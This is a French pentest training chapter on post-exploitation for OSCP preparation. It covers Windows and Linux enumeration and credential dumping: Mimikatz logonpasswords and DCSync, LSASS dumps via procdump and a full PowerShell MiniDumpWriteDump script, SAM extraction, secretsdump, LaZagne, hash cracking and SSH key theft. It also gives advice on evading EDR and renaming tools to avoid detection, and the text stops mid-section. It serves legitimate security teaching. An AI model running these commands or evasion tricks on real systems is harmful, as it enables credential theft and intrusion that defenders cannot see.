# Post-Exploitation

## Introduction

La post-exploitation représente une phase critique dans le cycle d'un test d'intrusion ou d'une évaluation de sécurité offensive. Cette étape intervient après avoir obtenu un accès initial à un système cible, qu'il s'agisse d'une machine individuelle ou d'un point d'entrée dans un réseau plus large. Contrairement aux phases précédentes axées sur la découverte de vulnérabilités et l'exploitation initiale, la post-exploitation se concentre sur l'expansion méthodique de l'empreinte de l'attaquant, la collecte d'informations sensibles, et l'établissement d'un accès persistant.

Pour un professionnel en sécurité offensive visant des certifications comme l'OSCP, maîtriser les techniques de post-exploitation est fondamental. Cette phase détermine souvent la différence entre un test d'intrusion superficiel et une évaluation approfondie qui révèle les véritables risques auxquels une organisation est exposée. En effet, l'accès initial à un système ne constitue généralement que le début du parcours, la véritable valeur résidant dans la capacité à exploiter cet accès pour atteindre des objectifs plus significatifs.

Dans un contexte réel, ces objectifs peuvent inclure l'accès à des données sensibles, la compromission de systèmes critiques, ou la démonstration d'un impact métier tangible. Pour y parvenir, le testeur doit naviguer méthodiquement à travers l'environnement cible, en évitant la détection tout en maximisant la collecte d'informations et l'expansion de son contrôle.

### Risques liés à la détection par les équipes Blue-Team

La post-exploitation présente un paradoxe intrinsèque : plus l'attaquant approfondit son intrusion, plus il risque d'être détecté. Les équipes de défense (Blue-Team) disposent aujourd'hui d'un arsenal sophistiqué de solutions de détection qui compliquent considérablement la tâche des testeurs d'intrusion. Comprendre ces mécanismes de détection est essentiel pour mener des opérations de post-exploitation efficaces et discrètes.

Les systèmes de détection modernes s'appuient sur plusieurs couches de surveillance :

La surveillance comportementale analyse les activités inhabituelles sur les systèmes et réseaux. Par exemple, l'exécution soudaine de commandes PowerShell avec des paramètres de contournement d'AMSI (Antimalware Scan Interface) ou l'utilisation d'outils d'administration système rarement employés peut déclencher des alertes. Les solutions EDR (Endpoint Detection and Response) sont particulièrement efficaces pour détecter ces anomalies comportementales, en établissant des profils d'activité normale et en signalant les déviations.

L'analyse des journaux système constitue une autre source précieuse d'informations pour les défenseurs. Les événements de sécurité Windows, les journaux d'authentification Linux, ou les logs de connexion à distance peuvent révéler des tentatives d'énumération, d'élévation de privilèges ou de mouvement latéral. Les SIEM (Security Information and Event Management) agrègent ces journaux et appliquent des règles de corrélation pour identifier les schémas d'attaque complexes.

La surveillance réseau représente également un défi majeur pour les attaquants. Les solutions de détection d'intrusion réseau (NIDS) et les pare-feu de nouvelle génération peuvent identifier les communications suspectes, les tunnels de données inhabituels, ou les tentatives de balayage interne. L'utilisation d'outils comme Nmap pour scanner un réseau interne peut ainsi être immédiatement repérée si elle n'est pas réalisée avec précaution.

Les pièges (honeypots, honeyfiles, honeytokens) constituent une approche proactive de détection. Ces leurres sont conçus pour attirer les attaquants et déclencher des alertes lorsqu'ils sont accédés. Un fichier nommé "passwords.txt" placé stratégiquement ou un compte utilisateur factice avec des privilèges élevés peuvent servir d'appâts pour révéler une présence non autorisée.

Face à ces mécanismes de détection, l'OPSEC (Operational Security) devient primordiale. Cette discipline consiste à minimiser la signature des activités offensives pour éviter la détection. Elle implique une planification minutieuse, une exécution prudente et une surveillance constante de l'impact des actions entreprises.

### L'approche OPSEC en post-exploitation

L'OPSEC en post-exploitation repose sur plusieurs principes fondamentaux que tout testeur d'intrusion doit intégrer à sa méthodologie :

La minimisation de l'empreinte constitue le premier principe. Il s'agit de limiter les actions aux stricts nécessaires pour atteindre les objectifs définis. Chaque commande exécutée, chaque outil déployé, et chaque connexion établie augmente le risque de détection. Un testeur expérimenté privilégiera les outils natifs du système (Living Off The Land) plutôt que de télécharger des utilitaires externes facilement détectables par les solutions antivirus.

Le contrôle du bruit technique représente un autre aspect crucial. Certaines activités, comme les scans de ports agressifs ou les tentatives d'authentification en masse, génèrent un volume important d'événements qui peuvent déclencher des alertes. L'utilisation de techniques plus discrètes, comme les scans lents ou ciblés, permet de maintenir un profil bas.

La gestion des artefacts laissés sur les systèmes compromis est également essentielle. Les fichiers temporaires, les entrées de registre, les processus en mémoire ou les connexions persistantes peuvent trahir une présence non autorisée. Un nettoyage rigoureux après chaque opération réduit considérablement le risque de détection a posteriori.

L'adaptation aux défenses en place constitue peut-être l'aspect le plus sophistiqué de l'OPSEC. Un testeur d'intrusion efficace doit être capable d'identifier les mécanismes de détection déployés et d'ajuster sa stratégie en conséquence. Par exemple, si une organisation utilise intensivement la journalisation PowerShell, l'utilisation d'alternatives comme des exécutables compilés ou des techniques d'injection directe en mémoire peut être préférable.

Dans les chapitres suivants, nous explorerons en détail les techniques et outils de post-exploitation, en gardant toujours à l'esprit ces considérations d'OPSEC. Nous verrons comment équilibrer efficacité opérationnelle et discrétion, en adaptant l'approche au contexte spécifique de chaque environnement cible.

La post-exploitation n'est pas simplement une collection de techniques et d'outils ; c'est un art qui requiert jugement, adaptabilité et une compréhension approfondie des mécanismes de défense. En maîtrisant ces aspects, le testeur d'intrusion peut non seulement démontrer des vulnérabilités techniques, mais aussi fournir une évaluation réaliste de la posture de sécurité globale d'une organisation.
# Sous-chapitre 1 : Énumération post-exploitation

## Introduction à l'énumération post-exploitation

L'énumération post-exploitation constitue la première étape cruciale après avoir obtenu un accès initial à un système. Cette phase méthodique de collecte d'informations permet de comprendre l'environnement compromis, d'identifier les vecteurs d'élévation de privilèges potentiels, et de préparer le terrain pour une expansion latérale dans le réseau. Contrairement à l'énumération externe, qui se concentre sur les services exposés, l'énumération post-exploitation bénéficie d'un accès interne privilégié, offrant ainsi une vision beaucoup plus complète et détaillée de la cible.

Pour un pentesteur visant l'OSCP, maîtriser cette phase est fondamental car elle détermine souvent le succès ou l'échec de la mission globale. Une énumération rigoureuse révèle non seulement les vulnérabilités exploitables, mais aussi les chemins de moindre résistance pour progresser dans l'infrastructure. Nous allons explorer les techniques d'énumération système, réseau et web, en distinguant les approches spécifiques aux environnements Windows et Linux.

## Énumération système Windows

L'environnement Windows offre une multitude de mécanismes pour collecter des informations système précieuses. Ces informations peuvent révéler des vulnérabilités, des configurations incorrectes ou des chemins d'élévation de privilèges.

### Commandes natives Windows

La commande `systeminfo` fournit un aperçu complet de la configuration système, incluant le système d'exploitation, la version, les correctifs installés et les informations matérielles. Cette commande est particulièrement précieuse pour identifier les systèmes non patchés susceptibles d'être vulnérables à des exploits connus. Par exemple, l'absence de certains correctifs de sécurité peut indiquer une vulnérabilité à des exploits comme EternalBlue (MS17-010). Du point de vue OPSEC, cette commande génère des entrées dans les journaux de processus et peut être surveillée par les solutions EDR modernes, mais elle reste relativement discrète car elle fait partie des outils d'administration légitimes.

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

La commande `hostname` révèle le nom de la machine, ce qui peut fournir des indices sur sa fonction dans le réseau (par exemple, DC-PROD-01 suggère un contrôleur de domaine de production). Cette information est essentielle pour comprendre la nomenclature du réseau et potentiellement identifier d'autres systèmes suivant la même convention de nommage.

La commande `whoami /all` affiche l'identité actuelle, les groupes d'appartenance et les privilèges associés. Cette information est cruciale pour comprendre le niveau d'accès dont on dispose et identifier les privilèges qui pourraient être exploités pour une élévation. Par exemple, la présence du privilège SeImpersonatePrivilege peut permettre d'utiliser des techniques comme le Potato (JuicyPotato, RoguePotato) pour obtenir des privilèges SYSTEM.

```
whoami /all
```

Les commandes `net user` et `net localgroup` permettent d'énumérer les utilisateurs locaux et les groupes, révélant potentiellement des comptes mal configurés ou des appartenances à des groupes privilégiés qui pourraient être exploités.

```
net user
net localgroup Administrators
```

L'utilitaire `wmic` (Windows Management Instrumentation Command-line) est extrêmement puissant pour l'énumération système. Il permet d'interroger pratiquement tous les aspects du système Windows de manière structurée.

```
wmic qfe get Caption,Description,HotFixID,InstalledOn  # Liste des correctifs installés
wmic service get Caption,Name,PathName,StartMode,State,Status  # Services
wmic process get Caption,CommandLine,ProcessId  # Processus en cours d'exécution
```

Du point de vue OPSEC, WMIC génère des logs significatifs et son utilisation intensive peut attirer l'attention des équipes de sécurité. Les solutions EDR modernes surveillent particulièrement son utilisation pour des commandes de reconnaissance.

### Outils d'énumération avancés Windows

PowerView, un module PowerShell de la suite PowerSploit, est spécialement conçu pour l'énumération des environnements Active Directory. Il permet de cartographier les relations entre utilisateurs, groupes, ordinateurs et objets de stratégie de groupe (GPO) dans un domaine.

```powershell
Import-Module .\PowerView.ps1
Get-NetDomain  # Informations sur le domaine
Get-NetUser  # Utilisateurs du domaine
Get-NetComputer  # Ordinateurs du domaine
Find-LocalAdminAccess  # Machines où l'utilisateur actuel a des droits d'administrateur local
```

PowerView est particulièrement surveillé par les défenses modernes. Son exécution déclenche souvent des alertes dans les solutions EDR et SIEM, car il est connu comme un outil offensif. Pour atténuer ce risque, il est recommandé d'utiliser des versions obfusquées ou de modifier le code source pour éviter les signatures connues.

BloodHound représente l'état de l'art en matière d'énumération Active Directory. Cet outil collecte des données via son ingesteur SharpHound, puis les visualise sous forme de graphe, révélant des chemins d'attaque complexes qui seraient difficiles à identifier manuellement.

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

L'exécution de SharpHound génère un trafic réseau significatif et des requêtes LDAP qui peuvent être détectées. De plus, le fichier ZIP de sortie contenant les données collectées peut être repéré par les solutions de surveillance de fichiers. Une approche plus discrète consiste à exécuter des collections ciblées (par exemple, `-CollectionMethod Session,LoggedOn`) plutôt que la méthode "All" plus bruyante.

WinPEAS (Windows Privilege Escalation Awesome Script) est un script tout-en-un qui automatise la recherche de vecteurs d'élévation de privilèges. Il vérifie les configurations incorrectes, les informations d'identification stockées, les tâches planifiées vulnérables, et bien plus encore.

```
winPEAS.exe quiet cmd fast
```

Seatbelt est un autre outil d'énumération C# qui collecte diverses informations sur la sécurité de l'hôte Windows. Il est particulièrement utile pour identifier les problèmes de configuration et les opportunités d'élévation de privilèges.

```
Seatbelt.exe -group=all
```

Ces outils d'énumération automatisés sont extrêmement efficaces mais génèrent un volume important d'activité système. Ils sont souvent détectés par les solutions de sécurité modernes, soit par signature, soit par comportement. Pour une approche plus discrète, il est préférable d'exécuter des vérifications ciblées plutôt que des scans complets, et d'espacer les exécutions dans le temps.

## Énumération système Linux

L'énumération des systèmes Linux suit une philosophie similaire à celle de Windows, mais avec des outils et des cibles différents. La nature ouverte des systèmes Unix offre souvent des informations plus directement accessibles.

### Commandes natives Linux

La commande `uname -a` affiche des informations complètes sur le noyau, la version et l'architecture du système. Cette information est cruciale pour identifier les vulnérabilités potentielles du noyau, comme DirtyCow (CVE-2016-5195) ou d'autres exploits spécifiques à certaines versions.

```
uname -a
```

Les commandes `id`, `whoami` et `groups` révèlent l'identité actuelle et les appartenances aux groupes. Dans Linux, l'appartenance à certains groupes (comme docker, lxd, sudo) peut offrir des chemins directs vers l'élévation de privilèges.

```
id
groups
```

L'examen des fichiers `/etc/passwd` et `/etc/shadow` (ce dernier nécessitant généralement des privilèges root) peut révéler des informations sur les utilisateurs du système, leurs répertoires personnels et potentiellement des hachages de mots de passe.

```
cat /etc/passwd
cat /etc/shadow  # Nécessite généralement des privilèges élevés
```

La commande `sudo -l` liste les commandes que l'utilisateur actuel peut exécuter avec des privilèges sudo. Cette information est extrêmement précieuse, car de nombreuses configurations sudo mal configurées permettent l'élévation de privilèges.

```
sudo -l
```

La recherche de binaires avec le bit SUID activé peut révéler des opportunités d'exécution de commandes avec des privilèges élevés :

```
find / -perm -4000 -type f 2>/dev/null
```

L'examen des tâches cron peut révéler des scripts exécutés périodiquement, potentiellement avec des privilèges élevés, qui pourraient être détournés :

```
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

Du point de vue OPSEC, ces commandes natives génèrent généralement moins de bruit que leurs équivalents Windows, car la journalisation par défaut est souvent moins extensive. Cependant, les systèmes bien sécurisés peuvent avoir mis en place des solutions comme auditd ou des HIDS qui surveillent l'exécution de commandes suspectes.

### Outils d'énumération avancés Linux

LinPEAS (Linux Privilege Escalation Awesome Script) est l'équivalent Linux de WinPEAS, automatisant la recherche de vecteurs d'élévation de privilèges. Il vérifie les configurations incorrectes, les informations d'identification stockées, les tâches cron vulnérables, et bien plus encore.

```
./linpeas.sh
```

L'outil pspy permet de surveiller les processus en cours d'exécution sans nécessiter de privilèges root. Il est particulièrement utile pour identifier les tâches cron ou les processus intermittents qui pourraient être exploités.

```
./pspy64 -pf -i 1000
```

Linux Smart Enumeration (lse.sh) est un autre script d'énumération qui fournit une sortie bien structurée et colorée, facilitant l'identification des vecteurs d'attaque potentiels.

```
./lse.sh -l 1 -i
```

Ces outils automatisés sont extrêmement efficaces mais peuvent générer un volume important d'activité système. Sur les systèmes bien surveillés, leur exécution peut déclencher des alertes. Pour une approche plus discrète, il est préférable d'exécuter des vérifications ciblées plutôt que des scans complets, et d'espacer les exécutions dans le temps.

## Énumération réseau

L'énumération réseau post-exploitation vise à comprendre la topologie du réseau, identifier d'autres systèmes accessibles, et préparer le mouvement latéral. Cette phase est cruciale pour étendre l'empreinte au-delà du système initialement compromis.

### Commandes d'énumération réseau Windows et Linux

Les commandes `ipconfig` (Windows) ou `ifconfig`/`ip addr` (Linux) affichent les interfaces réseau et leurs configurations. Ces informations révèlent non seulement l'adresse IP du système compromis, mais aussi les réseaux auxquels il est connecté, y compris potentiellement des segments internes non accessibles de l'extérieur.

```
# Windows
ipconfig /all

# Linux
ifconfig -a
ip addr
```

Les commandes `arp -a` (Windows et Linux) ou `ip neigh` (Linux moderne) affichent la table ARP, révélant les systèmes avec lesquels la machine a récemment communiqué. Cette information fournit une première vue des hôtes actifs à proximité.

```
# Windows et Linux traditionnel
arp -a

# Linux moderne
ip neigh
```

Les commandes `route print` (Windows) ou `route`/`ip route` (Linux) affichent la table de routage, révélant comment le trafic est dirigé vers différents réseaux. Cette information est essentielle pour comprendre la segmentation du réseau et identifier les passerelles potentielles vers d'autres segments.

```
# Windows
route print

# Linux
route
ip route
```

Les commandes `netstat -ano` (Windows) ou `netstat -tuln`/`ss -tuln` (Linux) affichent les connexions réseau actives et les ports en écoute. Cette information révèle les services en cours d'exécution sur la machine et les connexions établies avec d'autres systèmes.

```
# Windows
netstat -ano

# Linux
netstat -tuln
ss -tuln
```

La commande `lsof -i` sous Linux fournit des informations détaillées sur les fichiers ouverts par les processus réseau, révélant quels processus écoutent sur quels ports ou maintiennent quelles connexions.

```
lsof -i
```

### Scan réseau interne

Nmap reste l'outil de référence pour le scan réseau, même en post-exploitation. Un scan interne peut révéler des services et des systèmes non visibles de l'extérieur.

```
# Scan basique des 1000 ports les plus courants
nmap -sT -T4 10.0.0.0/24

# Scan plus discret
nmap -sT -T2 10.0.0.0/24

# Scan de tous les ports avec détection de version
nmap -sT -p- -sV 10.0.0.1
```

Du point de vue OPSEC, les scans Nmap sont extrêmement bruyants et facilement détectables par les solutions de sécurité réseau. Pour une approche plus discrète, on peut :
- Utiliser des options de temporisation plus lentes (-T2 ou -T1)
- Scanner des plages d'adresses IP limitées plutôt que des sous-réseaux entiers
- Cibler des ports spécifiques plutôt que de scanner tous les ports
- Utiliser des techniques comme le ping sweep pour identifier les hôtes actifs avant de scanner des ports

```
# Ping sweep plus discret
for i in {1..254}; do ping -c 1 -W 1 10.0.0.$i | grep "64 bytes"; done
```

## Énumération web

L'énumération des applications web internes peut révéler des interfaces d'administration, des API ou des services non exposés à l'extérieur, offrant souvent des vecteurs d'attaque privilégiés.

### Navigateurs et données de navigation

L'examen des données de navigation stockées localement peut révéler des informations précieuses :

```
# Windows - Chrome
type "%LOCALAPPDATA%\Google\Chrome\User Data\Default\History" | findstr -i "admin portal login"

# Linux - Firefox
grep -i "admin\|portal\|login" ~/.mozilla/firefox/*.default/places.sqlite
```

### Fichiers de configuration web

Les fichiers de configuration des serveurs web contiennent souvent des informations sensibles comme des identifiants de base de données ou des chemins vers des ressources internes :

```
# Apache
cat /etc/apache2/sites-enabled/*
cat /var/www/html/config.php

# IIS
type C:\inetpub\wwwroot\web.config
```

### Bases de données locales

Les bases de données locales peuvent contenir des informations d'identification ou des données sensibles :

```
# SQLite
sqlite3 database.db .tables
sqlite3 database.db "SELECT * FROM users;"

# MySQL
mysql -u root -p -e "SHOW DATABASES; USE wordpress; SELECT user_login, user_pass FROM wp_users;"
```

## Conclusion sur l'énumération post-exploitation

L'énumération post-exploitation est un processus méthodique qui requiert patience et rigueur. La qualité et l'exhaustivité de cette phase déterminent souvent le succès des étapes ultérieures. Un pentesteur efficace doit équilibrer la profondeur de l'énumération avec les considérations OPSEC, en adaptant son approche au niveau de surveillance de l'environnement cible.

Les outils automatisés comme WinPEAS, LinPEAS, BloodHound ou PowerView accélèrent considérablement le processus, mais leur utilisation doit être judicieuse dans les environnements hautement surveillés. Dans ces contextes, une approche manuelle plus ciblée, utilisant principalement des outils natifs du système, peut s'avérer plus discrète et tout aussi efficace.

Enfin, il est essentiel de documenter systématiquement les résultats de l'énumération. Ces informations serviront de base pour les phases suivantes : dump de credentials, élévation de privilèges, et mouvement latéral. Une documentation claire permet également d'éviter de répéter des actions potentiellement bruyantes et de maintenir une vision globale de l'environnement compromis.
# Sous-chapitre 2 : Dump de credentials

## Introduction au dump de credentials

Après avoir réalisé une énumération approfondie du système compromis, l'extraction des informations d'authentification constitue une étape déterminante dans le processus de post-exploitation. Cette phase, communément appelée "dump de credentials", vise à récupérer les mots de passe, hachages, tickets et autres secrets stockés sur le système cible. Ces informations permettent non seulement d'élever les privilèges sur la machine compromise, mais aussi de faciliter le mouvement latéral vers d'autres systèmes du réseau.

Pour un pentesteur visant l'OSCP, maîtriser les techniques de dump de credentials est essentiel. Cette compétence permet souvent de transformer un accès limité en une compromission complète du domaine. Cependant, ces techniques sont parmi les plus surveillées par les équipes de défense, nécessitant une approche méthodique et consciente des risques de détection.

Dans ce sous-chapitre, nous explorerons les différentes méthodes d'extraction de credentials sur les systèmes Windows et Linux, en mettant l'accent sur les outils, les workflows opérationnels, et les considérations OPSEC associées.

## Dump de credentials sous Windows

Windows stocke les informations d'authentification à divers endroits et sous différentes formes, offrant plusieurs vecteurs d'extraction. La compréhension de ces mécanismes est fondamentale pour choisir la technique la plus appropriée selon le contexte.

### Mimikatz : l'outil de référence

Mimikatz, développé par Benjamin Delpy (@gentilkiwi), est sans doute l'outil le plus puissant et le plus connu pour l'extraction de credentials sous Windows. Il exploite diverses failles de conception dans la gestion des authentifications Windows pour extraire des mots de passe en clair, des hachages, et des tickets Kerberos directement depuis la mémoire.

#### Workflow opérationnel de Mimikatz

L'utilisation de Mimikatz suit généralement un workflow structuré pour maximiser l'extraction d'informations tout en minimisant les risques de détection :

1. Élévation des privilèges : Mimikatz nécessite des privilèges SYSTEM ou administrateur local pour accéder aux zones mémoire sensibles.

```
privilege::debug
```

Cette commande tente d'obtenir le privilège SeDebugPrivilege, nécessaire pour accéder à la mémoire des processus système. L'échec de cette commande indique généralement des privilèges insuffisants.

2. Extraction des mots de passe en mémoire :

```
sekurlsa::logonpasswords
```

Cette commande emblématique de Mimikatz extrait les mots de passe en clair, les hachages NTLM, et d'autres informations d'authentification directement depuis la mémoire du processus LSASS (Local Security Authority Subsystem Service). Elle fonctionne car Windows, pour faciliter certains mécanismes d'authentification comme Kerberos, conserve temporairement les informations d'authentification en mémoire, y compris parfois les mots de passe en clair.

3. Extraction des tickets Kerberos :

```
sekurlsa::tickets
```

Cette commande extrait les tickets Kerberos stockés en mémoire, potentiellement utilisables pour des attaques de type "Pass-the-Ticket".

4. Extraction des hachages à partir de la base SAM :

```
lsadump::sam
```

Cette commande extrait les hachages NTLM des comptes locaux stockés dans la base SAM (Security Account Manager). Contrairement à `sekurlsa::logonpasswords` qui cible la mémoire, cette commande accède directement aux fichiers système.

5. Extraction des secrets LSA :

```
lsadump::secrets
```

Cette commande extrait les "secrets LSA", qui peuvent contenir des mots de passe de service, des informations d'authentification pour les tâches planifiées, ou d'autres secrets système.

6. Dans un environnement de domaine, extraction de la base NTDS :

```
lsadump::dcsync /domain:entreprise.local /all
```

Cette puissante commande simule le comportement d'un contrôleur de domaine et demande la synchronisation des hachages de tous les utilisateurs du domaine. Elle nécessite des privilèges d'administrateur de domaine ou des droits équivalents.

#### Considérations OPSEC pour Mimikatz

Mimikatz est l'un des outils les plus détectés par les solutions de sécurité modernes. Son utilisation présente plusieurs risques :

L'exécution directe du binaire mimikatz.exe est presque systématiquement bloquée par les antivirus et EDR. Pour contourner cette limitation, plusieurs approches existent :

L'utilisation de versions obfusquées ou recompilées avec des modifications mineures peut parfois échapper à la détection basée sur les signatures. Cependant, les EDR modernes utilisent également la détection comportementale, rendant cette approche de moins en moins efficace.

L'injection en mémoire de Mimikatz via des frameworks comme PowerShell Empire, Covenant ou Cobalt Strike évite l'écriture du binaire sur le disque. Cette technique, bien que plus discrète, reste détectable par les EDR avancés qui surveillent les allocations mémoire suspectes et les appels API caractéristiques.

L'utilisation de versions PowerShell comme Invoke-Mimikatz offre plus de flexibilité, mais ces scripts sont également largement détectés. L'obfuscation du code PowerShell peut améliorer les chances d'évasion, mais n'est pas infaillible.

L'accès au processus LSASS est particulièrement surveillé. Les solutions EDR modernes génèrent des alertes lorsqu'un processus tente d'ouvrir LSASS avec certains droits d'accès. Windows 10 et Server 2019 incluent également la fonctionnalité "LSA Protection" (également appelée RunAsPPL) qui empêche l'accès direct à la mémoire de LSASS sans un pilote signé.

Pour minimiser les risques de détection lors de l'utilisation de Mimikatz :

- Privilégier l'exécution en mémoire plutôt que sur disque
- Utiliser des versions personnalisées ou obfusquées
- Limiter l'utilisation aux commandes strictement nécessaires
- Éviter les extractions multiples ou répétées
- Considérer des alternatives moins détectées pour certaines fonctionnalités

### Extraction de la mémoire LSASS

Une approche alternative à l'utilisation directe de Mimikatz consiste à extraire d'abord la mémoire du processus LSASS, puis à analyser ce dump hors ligne. Cette méthode présente plusieurs avantages OPSEC :

- L'extraction peut être réalisée avec des outils légitimes du système
- L'analyse des credentials se fait sur la machine de l'attaquant, réduisant l'exposition sur la cible
- Le risque de détection est significativement réduit

#### Création d'un dump LSASS avec des outils natifs

Task Manager : Dans Windows, le gestionnaire de tâches permet de créer un dump de processus. Cette méthode est particulièrement discrète car elle utilise une fonctionnalité native de Windows :

1. Ouvrir le gestionnaire de tâches (taskmgr.exe)
2. Aller dans l'onglet "Détails"
3. Faire un clic droit sur le processus lsass.exe
4. Sélectionner "Créer un fichier dump"

Cette méthode génère un fichier .dmp dans le dossier %TEMP% ou %USERPROFILE%\AppData\Local\Temp.

Procdump de Sysinternals : Cet outil légitime de Microsoft peut être utilisé pour créer des dumps de processus :

```
procdump.exe -ma lsass.exe lsass.dmp
```

L'option `-ma` capture l'intégralité de l'espace d'adressage du processus. Bien que procdump soit un outil légitime, son utilisation spécifique sur LSASS est souvent détectée. Une technique d'évasion consiste à renommer l'exécutable et à utiliser l'ID de processus plutôt que le nom :

```
renamed-procdump.exe -ma 672 output.dmp
```

PowerShell : Des techniques PowerShell permettent également de créer des dumps de processus :

```powershell
$process = Get-Process lsass
$dumpfile = "C:\Windows\Temp\memory.dmp"
$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
$flags = [Reflection.BindingFlags] 'NonPublic, Static'
$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
$processHandle = $process.Handle
$processPid = $process.Id
$dumpFileStream = New-Object IO.FileStream($dumpfile, [IO.FileMode]::Create)
$result = $MiniDumpWriteDump.Invoke($null, @($processHandle, $processPid, $dumpFileStream.SafeFileHandle, 0x00000002, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))
$dumpFileStream.Close()
```

Ce script utilise l'API MiniDumpWriteDump via réflexion, ce qui peut parfois échapper à la détection basée sur les appels API directs.

#### Analyse du dump LSASS hors ligne

Une fois le dump LSASS obtenu, il peut être transféré sur la machine de l'attaquant pour analyse. Plusieurs outils permettent d'extraire les credentials d'un dump LSASS :

Mimikatz peut analyser un dump LSASS avec la commande :

```
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

PyKatz, une implémentation Python de certaines fonctionnalités de Mimikatz, peut également analyser des dumps LSASS :

```
python pypykatz.py lsa minidump lsass.dmp
```

L'avantage de cette approche est qu'elle limite l'exposition d'outils offensifs sur la cible et réduit les risques de détection en temps réel.

### Extraction des hachages SAM

La base SAM (Security Account Manager) stocke les hachages des comptes locaux Windows. Son extraction permet de récupérer les hachages NTLM des utilisateurs locaux, potentiellement utilisables pour des attaques de type "Pass-the-Hash" ou pour des tentatives de cracking hors ligne.

#### Extraction avec des outils natifs

Reg.exe permet d'exporter les ruches de registre nécessaires :

```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

Ces fichiers peuvent ensuite être transférés sur la machine de l'attaquant pour analyse.

#### Extraction et analyse avec Impacket

Secretsdump.py de la suite Impacket permet d'extraire et d'analyser les hachages à partir des fichiers SAM et SYSTEM :

```
secretsdump.py -sam sam.save -system system.save LOCAL
```

Cette commande extrait les hachages NTLM des comptes locaux, qui peuvent ensuite être utilisés pour des attaques de Pass-the-Hash ou des tentatives de cracking.

Dans un environnement de domaine, secretsdump.py peut également extraire les hachages directement depuis un contrôleur de domaine :

```
secretsdump.py domaine/administrateur:motdepasse@192.168.1.10
```

Cette commande réalise une extraction similaire à la fonctionnalité DCSync de Mimikatz, mais avec un outil potentiellement moins détecté.

### LaZagne : extraction des credentials des applications

LaZagne est un outil spécialisé dans la récupération des mots de passe stockés par diverses applications : navigateurs web, clients email, clients FTP, etc. Son approche est différente de Mimikatz, car il cible les stockages spécifiques aux applications plutôt que les mécanismes d'authentification du système.

```
lazagne.exe all
```

Cette commande lance une recherche exhaustive de credentials dans toutes les applications supportées. Pour une approche plus discrète, il est préférable de cibler des catégories spécifiques :

```
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe windows
```

LaZagne est particulièrement utile pour récupérer des mots de passe qui pourraient être réutilisés dans d'autres contextes, comme des services cloud ou des applications internes.

### DPAPI : accès aux secrets chiffrés

Le Data Protection API (DPAPI) est un mécanisme utilisé par Windows pour chiffrer des informations sensibles comme les mots de passe des navigateurs, les identifiants stockés, ou les clés privées. Mimikatz permet d'interagir avec DPAPI pour déchiffrer ces secrets :

```
dpapi::masterkey /in:"C:\Users\utilisateur\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\<guid>" /sid:S-1-5-21-... /password:motdepasse
dpapi::chrome /in:"C:\Users\utilisateur\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

La première commande déchiffre une clé maître DPAPI, tandis que la seconde utilise cette clé pour déchiffrer les mots de passe stockés par Chrome.

## Dump de credentials sous Linux

Les systèmes Linux stockent les informations d'authentification différemment de Windows, nécessitant des approches spécifiques pour leur extraction.

### Extraction des hachages de mots de passe

Le fichier `/etc/shadow` contient les hachages des mots de passe des utilisateurs locaux. Son accès nécessite généralement des privilèges root :

```
cat /etc/shadow
```

Pour une analyse plus structurée, on peut combiner les informations de `/etc/passwd` et `/etc/shadow` :

```
unshadow /etc/passwd /etc/shadow > hashes.txt
```

Cette commande crée un fichier au format attendu par des outils de cracking comme John the Ripper.

### Cracking des hachages avec John the Ripper

Une fois les hachages extraits, John the Ripper peut être utilisé pour tenter de retrouver les mots de passe en clair :

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Pour les hachages particulièrement résistants, Hashcat offre des performances supérieures grâce à l'accélération GPU :

```
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

L'option `-m 1800` spécifie le type de hachage (ici, sha512crypt utilisé par défaut dans de nombreuses distributions Linux modernes).

### Extraction des clés SSH

Les clés SSH constituent souvent un vecteur privilégié pour le mouvement latéral dans les environnements Linux. Leur extraction est relativement simple :

```
find / -name "id_rsa" 2>/dev/null
```

Cette commande recherche les clés privées SSH sur tout le système. Une fois trouvées, ces clés peuvent être utilisées pour se connecter à d'autres systèmes où l'utilisateur a configuré l'authentification par clé.

Pour les clés protégées par une passphrase, ssh2john permet de convertir la clé en un format crackable :

```
python ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash
```

### Extraction des credentials des applications

Comme sous Windows, LaZagne dispose d'une version Linux capable d'extraire les mots de passe de diverses applications :

```
python lazagne.py all
```

Cette commande recherche les credentials dans les navigateurs, clients mail, gestionnaires de mots de passe, et autres applications supportées.

### Extraction depuis la mémoire

Sur les systèmes Linux modernes, l'outil Mimipenguin (inspiré de Mimikatz) tente d'extraire les mots de passe en clair depuis la mémoire :

```
python3 mimipenguin.py
```

Cet outil cible principalement les gestionnaires d'authentification comme GDM, LightDM, ou les processus ssh-agent.

## Considérations OPSEC et contre-mesures

Les techniques de dump de credentials sont parmi les plus surveillées par les équipes de défense. Comprendre les mécanismes de détection permet d'adapter son approche pour minimiser les risques.

### Mécanismes de détection courants

Les solutions EDR modernes surveillent spécifiquement :

L'accès au processus LSASS : Toute tentative d'ouverture de LSASS avec certains droits d'accès (notamment PROCESS_VM_READ) est considérée comme suspecte.

L'exécution d'outils connus : Mimikatz, LaZagne, et autres outils de dump sont détectés par signature ou par comportement.

Les appels API suspects : Certaines API Windows comme MiniDumpWriteDump, SamEnumerateUsersInDomain, ou LsaEnumerateLogonSessions sont étroitement surveillées.

Les modifications de registre : L'accès aux ruches SAM et SYSTEM via l'API de registre peut déclencher des alertes.

L'exfiltration de fichiers sensibles : Le transfert de dumps mémoire ou de fichiers de hachage est souvent détecté par les solutions de DLP (Data Loss Prevention).

### Techniques d'évasion avancées

Pour minimiser les risques de détection, plusieurs techniques peuvent être employées :

L'utilisation d'outils légitimes du système (Living Off The Land) plutôt que d'outils spécialisés réduit significativement le risque de détection basée sur les signatures.

